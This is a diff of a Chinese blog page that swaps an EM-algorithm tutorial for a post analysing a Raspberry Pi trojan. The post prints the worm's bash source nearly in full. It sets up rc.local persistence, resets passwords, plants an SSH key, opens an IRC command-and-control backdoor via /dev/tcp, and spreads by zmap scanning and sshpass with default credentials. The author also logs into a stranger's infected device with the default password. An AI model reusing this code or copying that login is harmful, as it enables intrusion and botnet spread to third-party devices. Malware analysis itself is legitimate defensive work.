@@ -28,10 +28,10 @@
   
     
   
-  <meta name="description" content="本文是机器学习系列的第一篇文章，以最简单的方式讲解机器学习的传统算法，最大期望算法。在很多传统领域，医院，药厂等等无法产生海量的数据的情形，">
+  <meta name="description" content="今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以">
 
   
-  <link rel="alternate" hreflang="zh-Hans" href="https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/">
+  <link rel="alternate" hreflang="zh-Hans" href="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
 
   
 
@@ -112,7 +112,7 @@
   <link rel="icon" type="image/png" href="../../../img/icon-32.png">
   <link rel="apple-touch-icon" type="image/png" href="../../../img/icon-192.png">
 
-  <link rel="canonical" href="https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/">
+  <link rel="canonical" href="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
 
   
   
@@ -124,15 +124,15 @@
   <meta property="twitter:card" content="summary_large_image">
   
   <meta property="og:site_name" content="Faith写字的地方">
-  <meta property="og:url" content="https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/">
-  <meta property="og:title" content="什么是最大期望算法(EM Algorithm) | Faith写字的地方">
-  <meta property="og:description" content="本文是机器学习系列的第一篇文章，以最简单的方式讲解机器学习的传统算法，最大期望算法。在很多传统领域，医院，药厂等等无法产生海量的数据的情形，"><meta property="og:image" content="https://academic.faithio.cn/img/code.jpg">
+  <meta property="og:url" content="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
+  <meta property="og:title" content="记一次树莓派Trojan的分析 | Faith写字的地方">
+  <meta property="og:description" content="今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以"><meta property="og:image" content="https://academic.faithio.cn/img/code.jpg">
   <meta property="twitter:image" content="https://academic.faithio.cn/img/code.jpg"><meta property="og:locale" content="zh-Hans">
   
     
-      <meta property="article:published_time" content="2020-02-28T18:30:36-05:00">
+      <meta property="article:published_time" content="2020-02-20T18:30:36-05:00">
     
-    <meta property="article:modified_time" content="2020-02-28T18:30:36-05:00">
+    <meta property="article:modified_time" content="2020-02-22T18:30:36-05:00">
   
 
   
@@ -141,7 +141,7 @@
   <script data-ad-client="ca-pub-1438507724851578" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
 
-  <title>什么是最大期望算法(EM Algorithm) | Faith写字的地方</title>
+  <title>记一次树莓派Trojan的分析 | Faith写字的地方</title>
 
 </head>
 
@@ -358,7 +358,7 @@
   
   
 <div class="article-container pt-3">
-  <h1 itemprop="name">什么是最大期望算法(EM Algorithm)</h1>
+  <h1 itemprop="name">记一次树莓派Trojan的分析</h1>
 
   
 
@@ -367,8 +367,8 @@
 
 
 
-<meta content="2020-02-28 18:30:36 -0500 EST" itemprop="datePublished">
-<meta content="2020-02-28 18:30:36 -0500 EST" itemprop="dateModified">
+<meta content="2020-02-20 18:30:36 -0500 EST" itemprop="datePublished">
+<meta content="2020-02-22 18:30:36 -0500 EST" itemprop="dateModified">
 
 <div class="article-metadata">
 
@@ -380,8 +380,10 @@
     
     
       
+          最近更新于
+      
     
-    <time>Feb 28, 2020</time>
+    <time>Feb 22, 2020</time>
   </span>
   
 
@@ -414,7 +416,7 @@
       
       
       <li>
-        <a href="https://twitter.com/intent/tweet?url=https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/&amp;text=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29" target="_blank" rel="noopener" class="share-btn-twitter">
+        <a href="https://twitter.com/intent/tweet?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;text=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-twitter">
           <i class="fab fa-twitter"></i>
         </a>
       </li>
@@ -427,7 +429,7 @@
       
       
       <li>
-        <a href="https://www.facebook.com/sharer.php?u=https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/&amp;t=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29" target="_blank" rel="noopener" class="share-btn-facebook">
+        <a href="https://www.facebook.com/sharer.php?u=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;t=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-facebook">
           <i class="fab fa-facebook-f"></i>
         </a>
       </li>
@@ -440,7 +442,7 @@
       
       
       <li>
-        <a href="mailto:?subject=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29&amp;body=https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/" target="_blank" rel="noopener" class="share-btn-email">
+        <a href="mailto:?subject=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90&amp;body=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener" class="share-btn-email">
           <i class="fas fa-envelope"></i>
         </a>
       </li>
@@ -453,7 +455,7 @@
       
       
       <li>
-        <a href="https://www.linkedin.com/shareArticle?url=https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/&amp;title=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29" target="_blank" rel="noopener" class="share-btn-linkedin">
+        <a href="https://www.linkedin.com/shareArticle?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;title=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-linkedin">
           <i class="fab fa-linkedin-in"></i>
         </a>
       </li>
@@ -466,7 +468,7 @@
       
       
       <li>
-        <a href="https://web.whatsapp.com/send?text=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29%20https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+        <a href="https://web.whatsapp.com/send?text=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90%20https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener" class="share-btn-whatsapp">
           <i class="fab fa-whatsapp"></i>
         </a>
       </li>
@@ -479,7 +481,7 @@
       
       
       <li>
-        <a href="https://service.weibo.com/share/share.php?url=https://academic.faithio.cn/zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/&amp;title=%e4%bb%80%e4%b9%88%e6%98%af%e6%9c%80%e5%a4%a7%e6%9c%9f%e6%9c%9b%e7%ae%97%e6%b3%95%28EM%20Algorithm%29" target="_blank" rel="noopener" class="share-btn-weibo">
+        <a href="https://service.weibo.com/share/share.php?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;title=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-weibo">
           <i class="fab fa-weibo"></i>
         </a>
       </li>
@@ -525,65 +527,211 @@
     <div class="article-style" itemprop="articleBody">
       
 
-<p>本文是机器学习系列的第一篇文章，以最简单的方式讲解机器学习的传统算法，最大期望算法。在很多传统领域，医院，药厂等等无法产生海量的数据的情形，深度学习并不适合，这时才是传统机器学习算法发挥作用的时候，废话不多说，下面直接进入学习。</p>
-
 <blockquote>
-<p>最大期望算法出现在很多涉及概率模型的计算生物学的应用中，那么它有什好处，它的原理是什么？</p>
+<p>今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以此记录一下过程。</p>
 </blockquote>
 
-<p>概率模型，例如隐马尔可夫模型或者贝叶斯网络会被用于建模生物学数据。它们因为高效以及高容错的参数学习因此很流行被广泛应用。但是，给概率模型训练的数据往往不是完整的，缺失数据经常会发生。譬如，在医学诊断，通常病人的患病历史只会有有限的医学测试。换句话说，在基因的聚类表达中，数据不完整是因为在这个概率模型中有意忽略了基因到聚类的分配产生。然而最大期望算法支持在概率模型用不完整的数据进行参数估计。</p>
+<h3 id="表征">表征</h3>
 
-<h3 id="以投硬币实验为例">以投硬币实验为例</h3>
+<p>当树莓派联网的时候，有线网口的数据灯狂闪，ssh无法登陆。只有通过外接显示器找到这个机器来查找了。</p>
 
-<p>假设我们有一组硬币A和B，它们都是不均衡的硬币，假设θA 和 θB 分别是A和B正面朝上的概率。</p>
+<p>首先TOP一下，一下子找到CPU占用的罪魁祸首，直接定位到这个恶意脚本。</p>
 
-<p>现在我们目标是估计θA 和 θB，通过<strong>随机</strong>挑选A或者B进行10次的投币实验，然后可以通过绘制下面表格很轻易的计算出它们的概率。</p>
+<pre><code class="language-bash">#!/bin/bash
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gb5sxzy4ujj30g806yq4b.jpg" alt="image-20200122112520254" /></p>
+MYSELF=`realpath $0`
+DEBUG=/dev/null
+echo $MYSELF &gt;&gt; $DEBUG
 
-<p>现在我们把难度加大一点，假设我们不知道每次实验是挑选哪组硬币，换句话说，就是我们只有以下实验的结果，怎么估算出A和B的概率呢？</p>
+if [ &quot;$EUID&quot; -ne 0 ]
+then
+    NEWMYSELF=`mktemp -u 'XXXXXXXX'`
+    sudo cp $MYSELF /opt/$NEWMYSELF
+    sudo sh -c &quot;echo '#!/bin/sh -e' &gt; /etc/rc.local&quot;
+    sudo sh -c &quot;echo /opt/$NEWMYSELF &gt;&gt; /etc/rc.local&quot;
+    sudo sh -c &quot;echo 'exit 0' &gt;&gt; /etc/rc.local&quot;
+    sleep 1
+    sudo reboot
+else
+</code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gb5t12ar0yj304m03it92.jpg" alt="image-20200122112826852" /></p>
+<p>首先做了自我拷贝，并且自动重启。</p>
 
-<p>这里我们引入z作为隐变量(hidden variables)或者潜在变量(latent factors)，z定义了每一组实验选用A还是B硬币作为实验。在这个情况下，z就是缺失的数据。这里我们就必须引入最大期望算法来进行计算。怎么做呢？</p>
+<pre><code class="language-bash">TMP1=`mktemp`
+echo $TMP1 &gt;&gt; $DEBUG
 
-<p>首先我先初始化θA 和 θB，在这里我们分别初始化为0.6和0.5，然后我们假设数据是正确的，利用最大似然估计(MLE)分别算出A和B硬币的概率。在这里由于抛硬币是离散分布，并且符合二项分布(Binomial distribution)。所以以第二组为例，我们可以分别算出θA 和 θB。</p>
+killall bins.sh
+killall minerd
+killall node
+killall nodejs
+killall ktx-armv4l
+killall ktx-i586
+killall ktx-m68k
+killall ktx-mips
+killall ktx-mipsel
+killall ktx-powerpc
+killall ktx-sh4
+killall ktx-sparc
+killall arm5
+killall zmap
+killall kaiten
+killall perl
+</code></pre>
 
-<p>根据二项分布的公式： $$ p_i(k)=\left({10\atop k}\right) \theta_i^k (1-\theta_i)^{10-k}\;. $$</p>
+<p>kill了一系列进程</p>
 
-<p>$$ \theta_A^9 (1-\theta_A)^{10-9}\simeq0.004 $$</p>
+<p>然后来到比较恶心的部分。</p>
 
-<p>$$ \theta_B^9 (1-\theta_B)^{10-9}\simeq0.001\;, $$</p>
+<pre><code class="language-bash">echo &quot;127.0.0.1 bins.deutschland-zahlung.eu&quot; &gt;&gt; /etc/hosts
+rm -rf /root/.bashrc
+rm -rf /home/pi/.bashrc
+</code></pre>
 
-<p>最后可以算出A的新概率为： $$ \frac{0.004}{0.004+0.001}=0.8 $$</p>
+<p>删除了你的所有用户配置</p>
 
-<p>B的新概率为: $$ \frac{0.001}{0.004+0.001}=0.2 $$</p>
+<pre><code>usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
+</code></pre>
 
-<p>其实上述公式是根据贝叶斯公式得到，</p>
+<p>把ssh密码修改了！</p>
 
-<p>由于 $$ 𝑃(𝐴)=0.5=𝑃(𝐵) $$</p>
+<pre><code>mkdir -p /root/.ssh
+echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;  &gt;&gt; /root/.ssh/authorized_keys
+</code></pre>
 
-<p>$$ P(A|H_9T_1) = \frac{P(A) \cdot P(H_9T_1|A)}{P(H_9T_1)} = \frac{P(A) \cdot P(H_9T_1|A)}{P(A) \cdot P(H_9T_1|A) + P(B) \cdot P(H_9T_1|B)} = \frac{0.5 \cdot 0.004}{0.5 \cdot 0.004 + 0.5 \cdot 0.001} = 0.8$$</p>
+<p>这里用到一个/tmp/public.pem 公钥，下面能看到为什么他这样用。</p>
 
-<blockquote>
-<p>上述步骤称作E-step，用于估计在出现H 9次 T 1次的情况下，分别是A或者B硬币的概率，至此我们可以计算出每组实验的A和B硬币的权重。</p>
+<pre><code class="language-bash">BOT=`mktemp -u 'XXXXXXXX'`
 
-<p>其实从数学的角度来考虑就是，我们通过最大似然估计计算了 $$ g(\theta) = logP(x; \theta) $$ 这个函数的下界。然后后面会不断更新这个下界，直到这个函数收敛。EM算法的最大好处就是不会出现overfit。</p>
-</blockquote>
+cat &gt; /tmp/$BOT &lt;&lt;'EOFMARKER'
+#!/bin/bash
 
-<p>接下来就是M-step，就是利用带权重的数据进行计算，重新更新θA 和 θB，一直迭代到参数收敛。</p>
+SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
+NICK=a${SYS:24}
+while [ true ]; do
 
-<p>整个过程如下图：</p>
+    arr[0]=&quot;ix1.undernet.org&quot;
+    arr[1]=&quot;ix2.undernet.org&quot;
+    arr[2]=&quot;Ashburn.Va.Us.UnderNet.org&quot;
+    arr[3]=&quot;Bucharest.RO.EU.Undernet.Org&quot;
+    arr[4]=&quot;Budapest.HU.EU.UnderNet.org&quot;
+    arr[5]=&quot;Chicago.IL.US.Undernet.org&quot;
+    rand=$[$RANDOM % 6]
+    svr=${arr[$rand]}
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gb5uxybu99j30iz0cpwfz.jpg" alt="image-20200122121719055" /></p>
+    eval 'exec 3&lt;&gt;/dev/tcp/$svr/6667;'
+    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+            continue
+    fi
 
-<blockquote>
-<p>在第十次迭代的过程，A的概率已经是首次实验的结果，而B也是趋向于0.45。但是在nonconcave functions, EM算法有可能会陷入局部最优解。同样的，梯度下降算法(gradient descent)或者牛顿法(Newton-Raphson)也可以用作数值优化拟合，但是EM算法因简单健壮并且易于实现而被广泛应用。</p>
-</blockquote>
+    echo $NICK
 
-<h3 id="应用场景">应用场景</h3>
+    eval 'printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;'
+    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+            continue
+    fi
+    eval 'printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;'
+    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+        continue
+    fi
 
-<p>譬如在基因簇表达的情形下，我们需要通过观察的显性特征去分组相关的基因簇，就是分辨出哪些基因簇影响这个特征。这种情况下可以特征参数对应不同基因的多参数高斯分布，这个情况下x就是测量特征，z就是对应的基因簇，参数$ \theta$ 就包括多参数高斯分布的均值和协方差。然后EM算法的步骤就是E-step计算属于各个基因簇的概率，M-step去分别更新参数$ \theta$, 一直到收敛。</p>
+    # Main loop
+    while [ true ]; do
+        eval &quot;read msg_in &lt;&amp;3;&quot;
+
+        if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+            break
+        fi
+
+        if  [[ &quot;$msg_in&quot; =~ &quot;PING&quot; ]] ; then
+            printf &quot;PONG %s\n&quot; &quot;${msg_in:5}&quot;;
+            eval 'printf &quot;PONG %s\r\n&quot; &quot;${msg_in:5}&quot; &gt;&amp;3;'
+            if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+                break
+            fi
+            sleep 1
+            eval 'printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;'
+            if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+                break
+            fi
+        elif [[ &quot;$msg_in&quot; =~ &quot;PRIVMSG&quot; ]] ; then
+            privmsg_h=$(echo $msg_in| cut -d':' -f 3)
+            privmsg_data=$(echo $msg_in| cut -d':' -f 4)
+            privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)
+
+            hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
+            sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
+
+            if [[ &quot;$sign&quot; == &quot;$hash&quot; ]] ; then
+                CMD=`echo $privmsg_data | base64 -d -i`
+                RES=`bash -c &quot;$CMD&quot; | base64 -w 0`
+                eval 'printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;'
+                if [[ ! &quot;$?&quot; -eq 0 ]] ; then
+                    break
+                fi
+            fi
+        fi
+    done
+done
+EOFMARKER
+
+chmod +x /tmp/$BOT
+nohup /tmp/$BOT 2&gt;&amp;1 &gt; /tmp/bot.log &amp;
+rm /tmp/nohup.log -rf
+rm -rf nohup.out
+sleep 3
+rm -rf /tmp/$BOT
+</code></pre>
+
+<p>直接是利用IRC协议，生成了一个后门，然后通过私信机器来执行指令，而上面那个公钥就是hash，如果hash比对一致的话就能执行下发的指令。那么到底是谁下发指令呢？其实还是botmaster，也就是JOIN #biret，这个频道里的人！但是这个也是一个傀儡机器，真正下发流程应该是 hacker -&gt; botmaster -&gt; bot(肉鸡)。我们先往下看他gan了什么！</p>
+
+<pre><code class="language-bash">NAME=`mktemp -u 'XXXXXXXX'`
+
+date &gt; /tmp/.s
+
+apt-get update -y --force-yes
+apt-get install zmap sshpass -y --force-yes
+
+while [ true ]; do
+    FILE=`mktemp`
+    zmap -p 22 -o $FILE -n 100000
+    killall ssh scp
+    for IP in `cat $FILE`
+    do
+        sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  &amp;&amp; echo $IP &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no &quot;cd /tmp &amp;&amp; chmod +x $NAME &amp;&amp; bash -c ./$NAME&quot; &amp;
+        sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  &amp;&amp; echo $IP &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no &quot;cd /tmp &amp;&amp; chmod +x $NAME &amp;&amp; bash -c ./$NAME&quot; &amp;
+    done
+    rm -rf $FILE
+    sleep 10
+done
+
+fi
+</code></pre>
+
+<p>其实很简答就是用zmap进行全网扫描，扫到树莓派的弱密码，默认密码raspberry，就是拷贝自身进去，不断复制，并且记录到本地/opt/.r。打开这个文件一看发现，哇擦，好几百个ip了，随便试了一个。</p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt7ctwovj30y00ektba.jpg" alt="image-20191211230723120" /></p>
+
+<p>居然进去了。查了一下位置，嗯。。捷克🇨🇿的。</p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt8jz59nj30aq054t8t.jpg" alt="image-20191211230832765" /></p>
+
+<p>ok，我回头再说IRC，我们可以径直找到那个channel，直接把botmaster揪出来！我随便起了个名字，进去了，发现嘿嘿，那个@salary就是botmaster。</p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt4c14wej31ao0ds42d.jpg" alt="image-20191211230423946" /></p>
+
+<p>然而，查了一下@salary的ip，发现事情并不是那么简单啊</p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttbu1en5j30p0028mxf.jpg" alt="image-20191211231141791" /></p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttcobfo1j30bw068jrm.jpg" alt="image-20191211231229583" /></p>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttc4trxij31160ruq9i.jpg" alt="image-20191211231158569" /></p>
+
+<p>这个黑客到底是谁呢？把泰国的TOT公共有限公司给黑了，当作傀儡机器。。。</p>
+
+<p>所以互联网的阴暗面真的不是广为人知……</p>
+
+<p>醒醒吧 同学们，不要再用默认密码，弱密码了，检查一下你们的路由器/服务器/手机&amp;……等</p>
 
     </div>
 
@@ -759,8 +907,15 @@
   
   
   <div class="post-nav-item">
+    <div class="meta-nav">下一页</div>
+    <a href="../../../zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/" rel="next">什么是最大期望算法(EM Algorithm)</a>
+  </div>
+  
+  
+  
+  <div class="post-nav-item">
     <div class="meta-nav">上一页</div>
-    <a href="../../../zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" rel="prev">记一次树莓派Trojan的分析</a>
+    <a href="../../../zh/post/%E5%A6%82%E4%BD%95%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bdiy%E7%94%B3%E8%AF%B7%E7%A0%94%E7%A9%B6%E7%94%9F/" rel="prev">如何从零开始DIY申请研究生-申请奖学金</a>
   </div>
   
 
